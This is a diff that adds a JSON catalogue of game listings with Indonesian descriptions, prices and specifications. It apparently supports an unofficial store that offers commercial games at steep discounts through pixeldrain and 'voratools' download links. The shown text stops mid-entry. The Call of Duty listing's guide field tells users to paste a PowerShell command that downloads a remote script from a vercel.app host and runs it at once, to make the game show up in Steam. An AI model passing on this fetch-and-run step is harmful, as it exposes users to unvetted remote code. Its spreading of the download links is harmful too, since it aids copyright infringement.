@@ -1,0 +1,3733 @@
+[
+  {
+    "id": "d9b613f2-1ac2-4800-bf68-4303c5dc84d7",
+    "title": "A Plague Tale: Requiem",
+    "price": 459000,
+    "description": "Game ini melanjutkan kisah dari seri sebelumnya (A Plague Tale: Innocence). Kamu akan mengikuti perjalanan dua saudara, Amicia dan Hugo, yang melarikan diri dari tanah asal mereka yang hancur akibat wabah. Mereka mencoba memulai hidup baru, tetapi kekuatan misterius Hugo kembali muncul dan membawa kehancuran berupa ribuan tikus mematikan.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/95527239-2c48-3e4c-b867-68865d86c0e0/t_500x300",
+    "download_links": [],
+    "created_at": "2026-04-18T16:37:20.357073+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i5-4690K / AMD FX-8300",
+        "gpu": "GTX 970 (4GB) / RX 590",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel Core i7-8700K / Ryzen 5 3600",
+        "gpu": "RTX 3070 / RX 6800 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.6773305152329587.zip"
+  },
+  {
+    "id": "fcd821af-ba47-400a-a0e7-265966e77b32",
+    "title": "Call of Duty® Modern Warfare® III ",
+    "price": 1050000,
+    "description": "Call of Duty: Modern Warfare III adalah game FPS (First-Person Shooter) bertema perang modern yang melanjutkan cerita dari Call of Duty: Modern Warfare II. Pemain kembali mengikuti perjuangan Task Force 141 yang dipimpin oleh Captain Price untuk menghadapi ancaman besar dari Vladimir Makarov. Game ini menghadirkan campaign sinematik dengan sistem Open Combat Missions yang memberi kebebasan lebih dalam menyelesaikan misi, mode multiplayer berisi map klasik yang diperbarui, serta mode Zombies skala besar yang bisa dimainkan bersama tim.",
+    "thumbnail": "https://sp.yimg.com/ib/th/id/OIP.xo_HJfFmaXaIYVrRcZ8gXwHaEK?pid=Api&w=148&h=148&c=7&dpr=2&rs=1",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/B3jNLmjE",
+        "icon": "fix",
+        "label": "Fix / Update"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-06-09T05:38:47.292443+00:00",
+    "genre": "Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64 Bit (latest update)*",
+        "cpu": "Windows 10 64 Bit (latest update)*",
+        "gpu": "NVIDIA GeForce GTX 960 / GTX 1650 or AMD Radeon RX 470",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64 Bit (latest update) or Windows 11 64 Bit (latest update)*",
+        "cpu": "Intel Core i7-6700K or AMD Ryzen 5 1600X",
+        "gpu": "NVIDIA GeForce GTX 1080Ti / RTX 3060 or AMD Radeon RX 6600XT or Intel Arc A770",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 15000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "kalau game belum muncul di steam library kalian buaka powersheel anda lalu pastekan                                irm \"https://luatools.vercel.app/CloudRedirect.ps1\" | iex",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.8585622285765487.zip"
+  },
+  {
+    "id": "9cc572fb-8bde-43bc-8632-388cae1023a8",
+    "title": "Chained Together",
+    "price": 474999,
+    "description": "Kisah dimulai di kedalaman neraka. Anda (dan teman-teman Anda jika bermain multiplayer) berperan sebagai jiwa yang berusaha melarikan diri dari tempat tersebut. Tujuan akhirnya adalah mendaki setinggi mungkin untuk mencapai puncak dan keluar dari neraka menuju kebebasan",
+    "thumbnail": "https://images.g2a.com/323x433/1x1x1/chained-together-p10000506208/04c025b98e72443cb9bf083f",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/GvpsL1xe",
+        "icon": "fix",
+        "label": "Fix / Update"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-04-16T12:53:15.904726+00:00",
+    "genre": "Survival",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Intel Core i5-6600 @ 3.1 GHz atau AMD R5 1600",
+        "gpu": "NVIDIA GeForce GTX 1650 atau AMD Radeon RX 570",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Intel Core i7-10700 @ 2.9 GHz atau AMD Ryzen 5 5600X",
+        "gpu": "NVIDIA GeForce RTX 3060 atau AMD Radeon RX 6600 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.9329709402100532.zip"
+  },
+  {
+    "id": "d6fb4ac6-e02f-4628-bdee-5c74fbd1334a",
+    "title": "pacify",
+    "price": 474999,
+    "description": "Pacify menceritakan tentang sekelompok investigator dari PAH Inc. (Paranormal Activity Helpers Incorporated) yang ditugaskan untuk membersihkan lokasi-lokasi berhantu sebelum properti tersebut dijual ke publik.",
+    "thumbnail": "https://imgproxy.eneba.games/8sSChDBXvDI0YXtrobXpTTdhjAo-T2F9V4muabW-aHs/rs:fit:300/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy9r/di1vRXlvcjNyZnA1/Tm5sbEIxYkRMa1dl/ZjVmel9scDlWVUU0/dy1nU0NjLmpwZw",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/93qaHsB1",
+        "icon": "fix",
+        "label": "Fix / Update"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-04-16T12:36:06.605303+00:00",
+    "genre": "Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7 (64-bit)",
+        "cpu": "Intel i5 atau setara AMD (kecepatan minimal 2.0 GHz)",
+        "gpu": "Kartu grafis dengan VRAM 2 GB",
+        "ram": "4 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel i7 atau setara AMD (kecepatan minimal 3.0 GHz)",
+        "gpu": "NVIDIA GeForce GTX 1060 / AMD Radeon RX 480 atau lebih tinggi",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "967050",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.9381732581830098.zip"
+  },
+  {
+    "id": "b8f3a2f3-d300-4859-ac31-86f1cf976d96",
+    "title": "LEGO® Batman™: Legacy of the Dark Knight",
+    "price": 1148998,
+    "description": "LEGO Batman: Legacy of the Dark Knight adalah game open-world action-adventure dari TT Games yang menceritakan perjalanan lengkap Batman, mulai dari masa muda Bruce Wayne hingga menjadi pelindung Gotham City. Pemain dapat menjelajahi Gotham yang luas, menghadapi musuh-musuh ikonik seperti Joker, Penguin, Bane, dan Mr. Freeze, serta bekerja sama dengan sekutu seperti Robin, Nightwing, Batgirl, Catwoman, dan Jim Gordon. Game ini memadukan humor khas LEGO dengan sistem pertarungan yang lebih modern, eksplorasi dunia terbuka, serta elemen stealth dan detektif yang terinspirasi dari seri Batman Arkham.",
+    "thumbnail": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxISEBUTEhIWFRUXFRIVFRcVFRUWFhUVFxYYFhUYFxUYHSggGBolGxcVITEhJSkrLy4uFx8zODMtNygtLisBCgoKDg0OGxAQGi0lHyAtLy8rLS0vLS4rLS0tLS8rKy0vLS0tKy0tLS0tLi0tLS0tLS0tLS0tLS0tLS0tLS0tLf/AABEIAQMAwgMBIgACEQEDEQH/xAAcAAABBQEBAQAAAAAAAAAAAAABAAIDBAUGBwj/xABHEAABAwIDBAcECAMGBAcAAAABAAIRAyEEEjEFQVFhBhMicYGRoTKxwfAHFCNCUmJy0RXh8TOCkqKywiRTY9IWFzRDc4Oz/8QAGgEAAwEBAQEAAAAAAAAAAAAAAQIDAAQFBv/EADMRAAICAQMDAgMGBQUAAAAAAAABAhEDBBIhMUFRImETcaEFMoGRwdEUQrHS8BUjM1NU/9oADAMBAAIRAxEAPwDxFFBIq4oUkgkmMJKEUUaANhJOSC1GGwknEJLUYbCKMJLUYCSKS1GAkiUEKMBJJJAIkggisYSCKSxhJJJLGCkhKS1mEknQlCO0A1JOhKEaNYAilCKKRgJIgI5UQAKQCdCICNGsbCUJ0JQjQLGQknIQhQbGpJxQQowIQhFJKwghKEUEDASRQKwRIIoIGEkkkgYlhGEkVcQUJQikUaBY1KEYRhCjWABOhGEYTqILGwlCclCNGGkIJ7hCahRhpCUJ5CLGEz3LbTWRFCE8tQIStDWNITU9wuhCRoNjUIToQQoIEE4oIGAkikQhRgJIpLUEenQhCMKqQgQki0J4aqKIrYwBOAUgYnBiooC7iOEYWnhdkOeJmBzkqHF4B1MwY5EaFUeJpWTWWLdWUsi1Ni4puHDq7qNOtcU2MqsbUYXEZnktcCLDKJ/OqYYru1aWWhh28WVKp/8AsqFrf8rAlcaTY126KGOAdUc5ohriXtHBru0G+E5fBQOZddN0W6NV8e0toMzOpGHXa0ZHAuBzOIEh2YRrDm2XWYn6IMcTLBSjKPaqxeLizSoxlGrbC3zR5ZC2+je1mYQVHvosrdY0UmsqNa5tiHPdlcCCR2R/e5LocV9E+1GG1Gm8fkr0/wDeWrjttUDTrdQ4Q6kMj/8A5D2qngCcoO/LO9CU125Gq+GHbGEFOu9rbsJD6Z403gOZ6EDvBVGFs7TbNHDP35KtE99F9v8AJUYs+lTkidJ7/TeqONiJ0uSq9t0Mq3jsgZ8nWMBMZc+ZsyJFwC1s7pIVHHYB1Jxa7UGDrY3sZCV4zRyxfBnQmkKw5iYWpXAopEMJEKQtQcEriNYxBPhCEtBsbCCkSQ2mscf6ecpAIwnR7virqIlhYntTGpwCohWSBSN7lGApGtVoomzaptqvE5wBIIjdG4Rp3JuPwmVk5pMyfGZ+Cp4So5pgEwdQPnVSYqvDdbuEjuzEGfIrok0o2zm2y3JIhLYHmtTabGDE9XVnLTw1CmIOrmU2Eg74zF2io04fA33Bg6yYmN2qf0iqTiKjvzPHlb4KM627kVjzKjruhfSBuFJDZhwiBYAboA712+H6dC08/eF4LSxrhoVZZtd40Kms2GS9URJaad3FnvGL6ZNIE8xryn4+i8w6RPo1cQ41CSCSQRGZp1OU9+42XMu2y87/AJhV3Y0udc8fcs8uJKoo0NPkUtzZbHawhtcYl7hybUp39abU3AgNdLhIuImL/wBYU9Af8PV76TvUt/3eqpYyrlIblmCdbTAaR7ympRgmVpybR0z6zY7ToFRp/EAQTIk5YMSeMHgsvblQPIMnOIa7wEAzvsPRQjaLw2G25AmOdp1sLqtivaLc0gOIls9rW4zX8+CzkhMelknZVe3TvPwURarpZLQRwJ9yruYtPH3KqRCWprmqdzUwhSlAeyHKhlU2VIBT2BsAos/H/kP7pIwkjs9jWRwnQpXMukGKvw2DcMDU9rE9rLpwCpHGK5CptVgiCo2Kd9z5e4LojGkSkxMMX4X8rqGq7M6ZgcNY1398qzVgMIaJJsSd1jIHOyqsyj7sxzd8FDLNM0V3NDAs7dPtj+0aCCI1eJjgYVTatSaryfxO95laOAw7c7CW6OpkQb+3/RVcDVYMdT692Wg6vlrGAewXDNIIIiOSlN7Yc9GHFzLgwi1ONF4uWmNxix4X0XrfST6JW1GGrs+oHTDm0nkXEz9nU0IjSfNeTbSw2Iw9R1GqypSeCC5jpbcaGN/Irz51E64uxOwzxdzS0fmtPcDc+STBB81tdEuieN2jUmlTc5kw+rUMMHGXn2jyEld/0g6E4PZeAq161bNiS0ih2WFvWSIDGPBkXu7UBNGqtgk3dHBbL7VOq38jfSowqjtKkc5H6T5tA+Cs7Ic7LVmziybQNXsPgm4kFz78Gz3x+y9GUl8BEcKvM0SU6Fm+G4e9V6bZBlsHWOEkx7lu7RoBtEOaCOw/fP3nARa3qsnYtJpzg6DIBznMd6g59z1XFLIo+wGMgRyHwVd7Fpvpaqq5i9XanFHht1JlB7EwtV2oxQuYueeKh1Mr5UoUjhdNhS2D2NhBPhJbaGyctCGUKRzbDxTQF1NErAxt/EI5U4W+HNPY2RPf6GP280OLo19xtNl1I5naaA7UaWvBOb0hT0abcwzzlzDNlIDsu/LIie9Z+KLS45mukHWW3jj2ROgClqJ7EhsS3Nmo/D5oA3zryY687rDutuVSph44SSe+NxjdPNaOHaTlkCcr3Wi32bvPUJ+DwVR4jq6jhMyGvOuhaQP6qWWPq46EHPbxZabhC2m18WIG/eHb+H8+S4zaFXtO/U6fNen4DB5qTqeXVgy8c4da3O9vzLzLbtA0672kRDj6qesdY+A6KalNol2T0lxeFth8RUpDg15y/wCA9n0U+0Nu4jFHrMTUNWp9m0OdEhjHFwaIiBLifFZ+DrCId671YqUGm4AGmhJ/ywvJU+eT1dvHBo0ummPw7eqw+JfToy5zWNyw3OczgJEi5J13rGxe0qtZ+eq99R51c9xefM7uSsBjWjdzJ/mPiqOIqybae9FTdgceDc2I8w86ktAvvJe1XsYYe7rG5XSZi8H55pdEMHmpuPFzWjuAJPqQtB+zD7IaJkcABqdXQLwvWSUoJM8uWdY8zrqNr4tlWiQ0OGSkZLgAJc90XnmAs3Y9IHOJE9kgTJgAgnuuFMdmVHtYBRqkCcxa0lk5jJLmgzAm+4ab1V2ngjTILXNJEdqkXEA6XJAvZCWKonoQ1jlNTlzRrmlbvyqlWowrezcRnuTuFnHK1pbRzuuQbksIA4nnKGNqtBAh05Wk6QAYi83N+C6oaiPR9jjnHngzH0b/ADwUFZkLYbTF8wIcQCALjLkGpMQdLKjiKHJdMWssbj0JN7XTM0sTS1WXtQ6pTeMfeVYSVj6sUUvwpDb0WXUbDvPwQdRgSdJiZGsTCsVyATJgZiLkASTGpsFmuolwLwOyXFs29ojNETOngny5FD5iY4uStklTLmDZvuju3FX8OOw6QBlyizQCb/ejU215Kpg2Q4Au9p1EhouCM0w61iLW5rXq0pNQNGtSDe0l3ZEW1k25KF7vUDJ6aRmY5v3hoMpnTK+SWjynyVSpXq1HOOaSXFx9m5K1MNTIfVYWZrGQS4AQ3MDYi91Xwo7TYm7nA3vGaBffZcebJukztxQ9Kfk0tiGmKkQHQx9iconI8a7zuXU9GcRULW9ZWFKhTDWlwa0vebEUmyLmA2SdGgcVzDcAX4g02ANc6pkBk5WgSXEyZs2T3NKi6RbcaKoZTJFOn2GDkDdx/M4kk96tjalG3wcGfDeRxXJ6JjtrbPw7DUFJ02cCar5JuQYBC8f6Y7XGKxL6ophkxYFxJ5kneq+N2o6pAJJgQPVUmgveGtEuJAAFzO4AbyuTU5Ibaj09zp0umcHb6lcSEcx5ei6mh0RaxzGYvENpVahaG0GDra3as3NBysvxK6HanQnZuEY1+Ir4gNJLcwyxmDS72W0ybwV4WT7Qwxko8tvpSbv5eT1o6bI03462eaZjy9EjK9K2t0AwdLDmuK9djA1riXNZUytdEEhoaYEiYlcjtTo3UpUuvpPZiMPb7WkbCdA9h7TD3psGuwZfuvvXSufAuTT5IdUdJ0K6U4WjTbTq4Vri2e31lUE8yA6PJdLtDb+zXiRRcJa27KrwR3B0iRzC8dFrhS0sQZF17uHPCqkv6nlZdInLcmd1jA9ga2nVzMJdlcJaHhxjtNmx3EHQ+apVqX2TxvaR77odH63W1OrcQJILJ0DweyDwDtCe47lpsw+So6m+Mzw4Zfw6kSOPJdOaVK07voJjVS2so9GxEn81UHtZLHDVfvAE6gbrrep4JpdJAgU2NO7TKfh6rJ6O4Z8OgEnOBZxaYcx9MmRuGYmN8Eb1u49/ZyN0sJ42XPscm/ev1JZMlSXs3+hzmNxB67sxAsZ/S0FQ4nEMh12kgEgTrbT0RxWGE5p3kKrUY7KDeAHZeWsx4r0dNOWPHtRpVOSbKrcdp2W63uTwVug4uptdAvPLQkLOpEgzrrO6Z4+a1sBR+wYf1/6yqaecpTqT7DZlGMePJAkpR3HyKS6LXklT8GfjMxqvJjuOgNpgaTqrWAoT1bXSabnkkcTAaHfPBLGO/wCIqGAQRYOAgG0xwOt0MJiO1mFyC10QALEAryrTds6FJ1SK7GxSpVc0Z3VuWXJGUzzJ9EMTWdUaXGMweLgRrmd74QwdJppsbvuXd0WVk0gGAf8AUbPgCoRm3abKycdySRb2BjW0nE1GufmY4a3ktLRJPePAKLBNIe1xFpB77qCg0nLAtaZGgnusVs7N2calSmww0HV0WbTb7bnW3NBPfA3obY8mnllFJeC/tzGNosfXYMpry2lOraYs9267jLe5ruK81r1S5xJ4rpOmO0hWrdkZWMAp0mj7lNnZY3yHnK5h3JJnltio+B8Ku5vqwOeup+jd4GKeAWis6jVGHLtBWI7PiuSKfTdBtY7iNxGi8zPD40HHydmOWySZs4XYOOrVapZSe6rSfNW4Dw8kmbmS4kE2VjpCNpPoUn4sVDSvkLwAJPEC4JA+9daOxvpCxFKOtayvYNzO7NTKNAXj2hrqPFdBU+kjDVGDrcNUMlpy5mOEtcHNN40IBXm5J6uORf7KaXRrr71Z1QjhcX62mc1isDtirSp4Z7KxploLWHKBlbEZ3cpFnHgrXQDC16OJrdaMmHptqNxYdGSzHANO4ungtbE/SY3/ANvDOn/qVAB5NB965PbfSbEYlmR5a2nObq2DKyZmTvcZ3klbHj1WWDhPHGKf5+7rz+oZSwwkpRk20YNYjO4t9mbfp3A+EIcwk8JrbL2I8cHC+TS2dii14MrscTXNU/WRBLg7OT/zWtkn+8Id35uC4BtjIXZdEa4qB9AmOsblaTo2oJLCeRJLe55XqaeSlBxfbocOphXqRtVNsUm1AKFMsL3Oc5xicjm+xpxzX4FRYvFknK2LhxJdawAKymMJqskRu7rHVOqUhJzNkXtcToRorwxRjbX+cHJJqUlZUYHl83dMwLwc0aWvEwp2XpOJ/CYE6Enn4qKnXAeyWSIuCYnQekclZwzGvplwaGhxiNbAQL8LSqYpSc3BLjz+JSTSqTM1tEAxd175J0sTEjhK08B/ZgTudr+qVrbS2NRbSOarTNT7IsYHyXdnI5zQDoSJ0tlWXQIDM14Be3MIIlsTvQxZNjt9xpuOVPb2K2Wp+L1P7ILQaxhEz70lXeiO6RzWMBl3In0Kb1UgHuWvg8Mw1avWPaztVDLgYmT2bA6pxwtMUvbAqZnN6uHSAHAZpiI13rw3KSaKfFriirsoAVGF1wLEHQ2IHzyWk/BEFreNRp8IcCoMJsxzuIFr7t/7Lo6tCaVOR2m1oPEiCR71Ryr1IfDk35VFGLhsBOSBuA1/MPPchJaXCSLvabm4zmR3WFlvbEwodWpsMAWc4/hY3tOPkPOFqdHm0ScVjngijTFesQw5Dka9zaVJpEEGo8O0I/s4mHFeXqZZJJU+9fQ+h+ytRi0+pyyyxUlGPCddbRwrsNTOrGHvATfqdL/ls/wtXrbsNTo02U6tTM+lQdicc9leqXsLGh7mCnGQBxc0B7u1Eu9rtiangyK7BUp/aOqYfDdW3EVnN6wsNfE1BVnrcgoFsNNs4BIvK5f4fM+svqz2v9e03/nX0/tPAekVFrXtytDeyfZAE35KszZWIIBFCqQYIIpPvOm5bv0j5PrcsuCzNP4gXEsceLjT6uSdTJ3r2qjg8SMHTqYal19TqcMWU3VeraQadPN2yQBAk67l2YP+NWeBrsinnlOMaT5rxwfOWJwr6cCpTeydM7XNmOEi626PQzHujLhyZAIipSuCJB9tex/Sfhj/AAoUqrYxGIdhadKnJqBuINSm54FSIAA6xua0g807/wAqNlte2k6i4uy5r1qoc5rS1r32MauFhxVbOQ8lo9AcfnYKlHq2Oc1rnmpRcGNJALiA+SAJPgt3oZ0bpNrYpmIpis+i4sDbcixzdR2hmOhOVpi911HR/wCj3ZNUdQ5ofiqQe2vT697ak06nVOqGkHdlrjlcOVRq1cH9H+y+uqUqQmqwN62m3E1S5gMZc7c2lxE8VTHPbK2Tyw3xaR5v0g6Ksq7Rbh8NlpdhzqpJblZlYH5jBDRJcGQCRIF7lZA6B7SjN9WMa/2lEe969QxX0U037SZmY84X6sS5pqPJ61rhTazMTmDYc1wA/BGiobZ+jPCN2jgcPSolrKgxVSsOseczKTWFsOJJb2nRaNUJy3OxoR2qjzLEdFcZSY6o+jlY0EuJfSsB3Ov4KHZFY03h0EC17xciLr2Hb/0XYAYTFOw9EitSp1C2KlV0VGUxWDcpMOJaR4uXTdH9jivsvCseJp1MFhmOaTYh1BoIA46kcCJ3JseVwdo0o7lR5vtCi1wZiacS9oeYGlWcr98XN9PvLDfjakkmJGblBjkvWKnR6rQ2f1OY5qdHq2kOPaLag6siDZzobG8Ery7aBLsxN5DiSbkkzck6nmV6ePL8SLaPInj+FPa+TFxL3McAQ2RB9kTE/GFqYl8NGX7NuR7w2LWMabhr5LI2oyNCSMutxe5IvwXX4vDA1RT1BoPByy72s1oG9PgnN3b7D5WkkzlsNhKlRj6jQS1sF7oAiTHG53mFp7I+0oVQToWwSL6OJ+F1fbhXsYymKrwH5SZoQQW5o9wPin0Nnimxxznt/jZ1ZtLZAOuqFdLA80WuDANCsLAiBYW3IrRyM/G3/GEk/HgO8q4ym0MLh7XXGdbDtEa24KRxAxDyRPtm36x+6gxzoZP53HTg3+abXr/bP/vctS0rz0rpCQTlHk09kPmsNYcTabDUrocSQHU28agn/AFxVDG9WQ9o7TZgE2PeBdbtXFvfiGAloALHkxAaMgc8k8AAq5sVK13KYcEllWRdEWuk2JGFoyPaqMDR+nLm9XAT+nmqnRfpNVw+GytkF7MrixwZmbne4B3ZJgF74LCww830IwukmJfWMk+yC0DkMrfO6yWbUqMaGgNIA3g/uvM1OKc4KMOzPqtE9LhzzeqVqS+v0PTP/HeIzsfmqyym6mD1rJAMTbqsjpygy5rnWEOF5r0emFZrKrRmis4ueOslryQGkvzNLySA0HK9gIaLC8+efxqrwZ5H90P45V4M8j+64f4XUefqeqtX9i/9b/J/uO6XVS+qHOMkgknx5aDkvd6XSPZdfZlDDv2oMO4UsPmdQrilVa5jWy3NBjSCIXz3jcW6rBdAMRaR71uu6WumqRQa01XYF74eYL8LMGIs183bNiAZXbjxOMEvB4Guz482onOH3W+D3Y9NNjtp0MK/HMrBopHrHvzmcOWva+rUiC8uY3mSTbVUa/0n7KG02s7Lvs+r+uBzTSYx32hYb6ZmtB5xwXjzOnb+sz/Vqf8A6n6z7dXOHdV1MZ5/BeYnNJEaDPq9KKrqmHeWMjD1n1mtv2i+r1sOcZcY9kEkkBNtZy2eu7N27s2j0ixGLbjKPU18GJdnGUVg+k0t7y1gd4lQdFuleBp7f2nXfiqTaVVlAU6hdDXkNYDlO+IK8p2x0oq4gsJaGBlZ9doaTd7skFx3kBgvzJWjQ+kCs2oHuo03Hr31yb5yXF5LesN4HWGJkCBZbaaz1o/SbhBg6jRiWGqMZUot7Rk0HYqG1Qfwig7NOnZhbdTpfsk4tuI/iFCWUalEDrN1R9N7v/zb6r562R0qdh6Boik14OIbiAXvf7TSwgODSM12Nvrd34loUfpArNLSKFGG1a1aO3BfWzl/3tO2Y3iBcwI21ms9f6NfSXsmpWxTTlw0vzGpUcMuJJlhe0/pa3XcRwWX006W4OhselSwWMo1K2HdhOqax+YxRc2LakZRflK8i2V0kfh6XVspsdGJp4oOcTmz0y0ta4iMzOzcHUwdytv6bPIrN6imBVp4mnYuGUV3FxgjUNnTkEXBms9a6W/SFgsTsYupYhjcQ8YZ/Uhw6xjxWpueI5Q49wXIYlrag6wCG1JcI0kwXAeJ9QuQ2l0rrYgVmmmxgrCmHCmC0AU6r6osLEkvgk3MA6rb6MYzPh+oPtCalM6ns2ezxbcc2816WidRcX8zztfj3LcuwzpDQaZOWOXO/wCy0tl7MDHdaIZDXBwYGZtH7jMzl1neszH1Mxu68gDyVjEbea4OGUAFpbeNIHuI9VeTnFrYrJ6fDHJjanKintLbRNem5odDZF2gGzjqAdf5K5jj9Yw7CJMB9qjWNIgsm381k7XxwqtAaBAe907+0Tb1U+zKopUabj941AZMgDM26Vyk0typsbNhxYmtjuiT+D0fxUfM/wDckq1TYwJJB1JO9JbZIT4y8shxGbqxqLG97+wPHf5qsxri4mTEAXmPun91ZNKANxv3alWuoilMm5IvxAPJacFFIaMqjwVXUOw7l+6sbWxBazTtVRT36UmWIPDM5pHc3mlg2Etc0WnfwAvKgxhNR7zFg3szctaLATb5KusdwtnSp7Ukvmyli8STNtSSeUlipVmgAmN3HvvotWjg2mMxjdE/lze8AIYprWi0GQIOo0B/cLlWmVMtk1LnLkyDQn1+fVV30oHitmowZQQNZ+Cq1KUz3/BTy4NoscibZnhtvFOa2YVllKxEbx7kqVK48PeoLHyFyKmRAhXBQm/MKPq7ovGwKRVLUAz58ladQ05wmspX8T7wpyxtDqSKwZKeaatmmAfH4hIs3Rcx706x1GwbrZSyotpq5SoyQOafToyQNxITLE2Bzojw1LtTyn3LWwVbL2mnK5plh/MDI+eSjwTB2p/C6PAE/BMI7Lf1FdUVtugS5jRu49zCW1GQGvAc1v4SAA5vg6fAjis3LM9pu7ihh3GCw6We3kQ3tebfVoTWus7d7Px/ZV3cnOsNIecPFpm8yPBXC0dU0R+P/UFUrv58PcrVBxLW3tmPuTpxnOKYuWNJ/P8AcTcXUAgOMCySmLeSCttRybvYZiKMfPMq2KzPq4ZlOYOLid2+ICzMTWd3Tf1Kdg3ktPl6KM4qSXsyitRL2z4uOIeojVDQ8by1404iBfvTaD48ne5RPMyupRSjRtzbDkD62ZoOW8WA3ExAsNCq9LDF1MRM3805lQiIAtJ9CNx5qxQrQB+3BRjyysW1ZSfh4ifwzfmo+rtqrWJfJ/utCiaLxzHrClOKuh1fLKzWRKOEoZnAfmb8VYNO5+d6nwMNqSdxHq14+KlsVsG8zRS+zHem0qABudyuESzlKbXpQbXsJ5G9uadQXA8pFWpSuOWVOrUu1HOfVT1mw1ul4+OqsYqhleHSIgeekeiTIl08mTMqq2ZI4D3qFrsv3RMzN5jhrEeHitDJp+kf0UOIpiGm9oAJcDa9gPFJkQ+OQcLS7Obu94/dW6dAgs4EZtN0WKbhWfZR82yq80tcPZMhrROYn04KkaJzvhmbh2kARvaR5tIPvTqjYA7yVZo0xl7mz6gX8Cq+K0Hj74+C1csEpPhBce0CODf9IUbqlyOMeg/mmNq+4e6FETdKdEnwWmukkjddWsG72RzJVTDd33eMcE6nUh3KU+OXq+RDIrRouJlJVDih8hJW3ENoKpkQn4TePnRQNqItqLWg1wSvqQTeNU9plvgVUruUzT2fD91SMzbR1NoyuMmZ0gRHfMzyhKifj7inUi3q3SDJiOHNVqb7j53KGOb3v5juPA+se0lcOHgfRR1ndo9596LqhLhJnQX7kzfqD/KTYQkkze+/vT8Q2Ce8KtQqgG+kiYMWm6mrVQXct0671PdyxGmGmOz4/BPqU/8AS0+ihpvVvDtzE8mt+A+KrF+kEmVnYc5J7z5blM7GVDR6vNb2dG3HfHAwrWHqtaCDxqDzAHwWViMQC4logGLcFJpP73YaMmOY23n71VxTQNN6tUzJb3mVBihJH9U00mjR6lvBUM1An88ROt26KOo5zJAGlnb9CZg8LJlBxFN3f/P4JYhhifHwuuaKal+J1OnETq5EAfh+P8lHXMgKJ14PKE4GQPBdFkZLnga0X8FFvUjjc9yjapsa2T4c69yBco8yWZBdTMkSRboiqCDC5PY5Q5kg9NHqGidysTbyVIPU7X2Ph8U10BLklzjKdZ9ItuUFM3HzuSLtU1qSK9RmF57R7yjUTHG6TyizBaVJVd2vAKAuhEVEiV8hoeHq1g65aTzAHhMrOzKak+D4JoglEt18STfeXOPmqk+5Bz0CVqMkSMKRKjade5DNdFVRqJmOsdNfnwUmJ9kab9O93z4qq5+oCmrVBlAHH4uUZL1IouhXlFpQLlGXapgJCLkA66jzJNUmylEriiVEAlKKfIGiTOioZSTWaiVEJiIVYMWiQJ4Nj4fFQyntNj88U0mZLkkO9JpTapufBBhSxfqBJCqG6bnSqaqNyE+5kiSZSYUxrkg5aL4DQgU8OUYRlZdDNEhcmlyaSmotmola5KVGChKCkah9R2qcaxMDcJ+P7qIlEfulkrdhA510EHJAoJhGohBKVJjEgCaEgUQmoAoSSSRAFFBJUiYKKSSMjITik1JJLH7yAwPN0xxSSWkZACIN0kkF0QRwTikkqfygAdE1JJLIwgkkkkQQpJJKoCMoj90klAYakUkkr6BCnBJJMgBSSSRMf//Z",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/5AW2kFoL",
+        "icon": "box",
+        "label": "Game File"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "fix",
+        "label": "Fix / Update"
+      }
+    ],
+    "created_at": "2026-06-09T12:46:59.347876+00:00",
+    "genre": "Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
